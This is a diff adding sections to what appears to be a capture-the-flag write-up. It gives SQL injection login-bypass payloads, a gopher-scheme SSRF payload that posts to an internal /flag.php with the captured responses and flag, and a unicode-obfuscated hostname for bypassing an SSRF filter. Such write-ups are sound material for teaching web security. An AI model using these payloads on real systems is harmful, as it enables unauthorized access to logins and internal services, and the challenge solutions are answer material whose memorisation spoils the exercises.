@@ -134,3 +134,61 @@ Sqli
 Payload username = ') or 1=1; --
 Payload password = fsdaf
 ```
+
+## Log me in: Revenge [25]
+
+Sqli
+
+```txt
+Payload User: ') union select "admin", "test" from admin where (''='
+Payload Password: test
+```
+
+## Preview Card [20]
+
+SSRF with GOPHER
+
+Flag (localhost only): /flag.php
+
+Get Source Code First
+
+```txt
+gopher://127.0.0.1:80/_GET%20/flag.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
+
+HTTP/1.1 200 OK
+Date: Tue, 02 Nov 2021 06:28:58 GMT
+Server: Apache/2.4.51 (Debian)
+X-Powered-By: PHP/7.4.25
+Vary: Accept-Encoding
+Content-Length: 149
+Content-Type: text/html; charset=UTF-8
+
+<form action="/flag.php" method="post">
+    Do you want the FLAG? <input type="text" name="givemeflag" value="no">
+    <input type="submit">
+</form>
+```
+
+Final Payload
+
+```txt
+gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2014%0d%0a%0d%0agivemeflag=yes%0d%0a
+
+HTTP/1.1 200 OK
+Date: Tue, 02 Nov 2021 06:31:52 GMT
+Server: Apache/2.4.51 (Debian)
+X-Powered-By: PHP/7.4.25
+Vary: Accept-Encoding
+Content-Length: 178
+Content-Type: text/html; charset=UTF-8
+
+<form action="/flag.php" method="post">
+    Do you want the FLAG? <input type="text" name="givemeflag" value="no">
+    <input type="submit">
+</form>
+FLAG:FLAG{gopher://http_post}
+```
+
+## SSRFrog
+
+url payload: `HTtp:ᵀhⒺ。c⓪Ｏ₀o⁰Ⓛ-fl⁴4④g｡sℰrvᴱᵣ.iⓝⓣeⓇnaᴸ`
